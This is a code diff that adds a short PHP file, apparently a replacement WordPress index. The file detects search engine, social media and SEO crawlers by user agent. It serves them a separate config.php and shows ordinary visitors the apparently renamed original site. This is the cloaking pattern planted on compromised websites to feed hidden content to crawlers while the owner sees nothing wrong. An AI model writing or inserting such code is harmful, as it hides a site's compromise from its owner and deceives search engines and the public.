@@ -1,0 +1,23 @@
+<?php
+session_start();
+
+// BOT KONTROLÜ
+$userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+$botPattern = '/
+    (bot|crawl|spider|slurp|fetch|scanner|search|mediapartners|google|bing|yahoo|yandex|baidu|duckduckgo)
+    |(googlebot|google-news|google-inspectiontool|adsbot-google|apis-google|feedfetcher-google|googleweblight|googlefavicon|google-read-aloud)
+    |(bingbot|bingpreview|msnbot)
+    |(yandex|baiduspider|duckduckbot|sogou|exabot|qihoobot|petalbot)
+    |(facebot|facebookexternalhit|ia_archiver|applebot|linkedinbot|twitterbot|slackbot|telegrambot|discordbot|whatsapp)
+    |(ahrefs|semrush|mj12bot|dotbot|rogerbot|screaming\s+frog|uptime|pingdom|monitis|gtmetrix)
+/ix';
+
+if (preg_match($botPattern, $userAgent)) {
+    include __DIR__ . '/config.php';
+    exit;
+} else {
+    define('WP_USE_THEMES', true);
+    require __DIR__ . '/index_lama.php';
+    exit;
+}
+?>
